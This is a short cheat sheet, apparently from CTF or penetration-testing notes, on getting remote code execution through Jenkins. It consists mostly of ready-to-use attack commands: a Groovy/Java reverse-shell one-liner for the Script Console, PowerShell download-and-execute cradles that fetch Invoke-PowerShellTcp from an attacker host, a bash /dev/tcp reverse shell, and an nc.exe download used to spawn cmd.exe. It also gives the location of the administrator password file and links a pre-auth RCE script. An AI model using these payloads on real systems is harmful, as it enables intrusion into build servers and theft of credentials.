# jenkins

## Options:

1. Manage Jenkins > Script Console
2. New Project > Execute Command on Build

## Groovy Script Console

```bash
# testing
cmd ="whoami"
cmd =""" cmd.exe /c echo "Hello World" """
println cmd.execute().text

# universal
String host="10.10.14.2";
int port=6969;
String cmd="cmd.exe";
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

# WINDOWS
cmd = """ powershell "IEX(New-Object Net.WebClient).downloadString('http://10.2.74.151:8888/Invoke-PowerShellTcp.ps1')" """
println cmd.execute().text


# LINUX
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.2.74.151/9090;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## New Project Method

```
# windows batch Command
powershell iex (New-Object System.Net.WebClient).DownloadString('http://10.2.74.151:8888/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 10.2.74.151 -Port 6969
[OR]
powershell wget "http://10.10.14.10/nc.exe" -outFile "nc.exe"
nc.exe -e cmd.exe <IP> <PORT>
```

## admin password file in windows

```
C:\Users\Administrator\.jenkins\secrets\initialAdminPassword
```

## [jenkins v2.150.1 preAuth RCE](https://github.com/iamkashz/ctf-scripts/blob/main/jenkins-preauth-rce-v2.150.1.sh)
